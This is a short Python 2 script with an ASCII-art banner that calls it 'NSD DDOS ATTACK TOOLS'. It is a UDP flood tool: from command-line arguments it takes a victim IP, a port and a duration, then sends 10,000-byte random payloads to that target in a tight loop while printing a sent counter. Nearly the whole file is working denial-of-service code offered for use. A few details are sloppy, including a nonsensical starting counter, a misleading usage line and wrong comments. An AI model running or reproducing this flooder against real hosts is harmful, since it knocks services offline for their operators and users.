
import time
import socket
import random
import sys
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def usage():

    print \
   bcolors.OKGREEN + """
       .,oo8888888888888888ooo,.
    ,od88888888888888888888888888oo,
 ,o0MMMMMMMMNMMMMM8888888888888888888o.
d888888888V'.o   ```VoooooooOOOOOOOOIII,
l888LLLLl:  O , ,O    ``VlMM88888IIAMMMMMOMb,
l8888888LLb `VooV',O,MoodlM88888IIIMMMMV'ddMOMb,
l88888888888booooooOlllllIIIIIIIIIAMMV',dMMOOMMMb,
888888888888888888LLLLIAMMMMMMMMMMMMMMMMMOOOMMMMMMb,
8M8888888888LLLMMMAAMMMAAMMMMMMMMMMMMMMOOOOMMMMMMMMb
88M8888888lll888888mmmmmmmmmmmmmmvvvvvvvvvvvvv,`MMMM
8888M888888llllllllllllllV::::V''~~        ~~'V lMMV
M8888MMM888888TTTMl8lllllb:::V'                `IiM'
MMMMM8888M8k88888l8Mklllllk:A'                  `V'
lMMMMMM888888888888MMMMMlll:M  NSD DDOS ATTACK TOOLS By Gamer2637..
l8MM8MMMM8888888888888MMMMllM   V.0.0.1 BETA 2018
[ NATIONAL SECURITY DEFENSE ] 

[*] boml0w.py ip port bytes
"""


def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(10000)
    timeout =  time.time() + duration
    sent = 90909090909090909090909090909090909
    
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print bcolors.HEADER + "[\033[94m*\033[95m] BYTES / SECOND [\033[92m%s\033[95m] TO [\033[91m%s\033[95m] PORT [\033[94m%s\033[95m] " %(sent, victim, vport) 

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

